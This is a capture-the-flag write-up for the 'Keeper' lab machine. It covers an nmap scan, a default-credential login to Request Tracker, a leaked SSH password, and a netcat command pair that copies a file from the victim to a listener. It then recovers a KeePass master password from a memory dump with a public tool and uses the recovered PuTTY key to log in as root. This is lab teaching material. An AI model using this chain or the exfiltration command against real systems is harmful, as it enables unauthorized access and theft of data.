---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Keeper

## Enumeration

### nmap

`nmap -sV 10.10.11.227`

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-08 08:54 EDT
Nmap scan report for 10.10.11.227
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
```

## Web (TCP 80)

The web is RT (Request Tracker), a ticketing system.

There is a login screen. Default credentials (google lookup) works. default password `root:password`

There you scan the tickets and users.

One ticket hinting KeePass `http://tickets.keeper.htb/rt/Ticket/Display.html?id=300000`

One user with default password :/ `http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27` That gives away the User

### User login

```
ssh lnorgaard@10.10.11.227
# Welcome2023!
```

## -> Root

There is a zip `RT30000.zip`

Exfiltrate it For example using netcat

```
# On listener
nc -lvnp 4444 > new_file
# On victim
nc -vn <IP> 4444 < exfil_file
```

It contains a memory dump and database.

### Keepass

There exists a vulnerability exploiting the memory dump to recover a master password See: https://github.com/vdohney/keepass-password-dumper

#### Tool

You need .NET 7 SDK `sudo apt-get install dotnet-sdk-7.0` And then run the tool

```
dotnet run ~/KeePassDumpFull.dmp
```

It produces

```
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●ødgrød med fløde
```

The first charackter is unknown. But after some googling, we can find it is a Danish sweet: `rødgrød med fløde`

So open the database

```
keepass2 passcodes.kdbx -pw:"rødgrød med fløde"
```

In the database, you will find Putty key. So copy it and store it to "keeper.ppk" file. Then convert it to pem so you can use it with ssh

```
puttygen keeper.ppk -O private-openssh -o keeper.pem
```

and login as a root

```
ssh -i keeper.pem root@10.10.11.227
```

\